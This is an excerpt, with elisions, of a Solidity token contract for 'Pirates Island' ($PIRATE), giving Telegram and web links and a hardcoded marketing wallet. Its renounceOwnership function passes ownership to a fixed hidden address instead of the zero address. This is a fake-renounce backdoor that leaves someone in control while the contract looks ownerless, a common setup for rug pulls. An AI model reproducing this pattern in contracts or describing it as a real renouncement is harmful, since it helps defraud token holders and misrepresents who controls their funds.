/**
    ...
    Pirates Island - $PIRATE

    Tg: https://t.me/piratesIsland_ETH
    Web: https://www.piratesisland.biz/
...
contract Ownable is Context {
    ...
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0x939398eF4637D099DFb7ccf5Ee7861395DB7F759));
        _owner = address(0x939398eF4637D099DFb7ccf5Ee7861395DB7F759);
    }
...
contract PIRATESISLAND is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;

    address payable public marketingAddress = payable(0x7449260C2FA3f9D59F7891411dC2487e9D76F12e); // Marketing Address
    ...
    string private constant _name = "Pirates Island";
    ...
    constructor() {
        ...
        marketingAddress = payable(0x7449260C2FA3f9D59F7891411dC2487e9D76F12e); //  update to marketing address
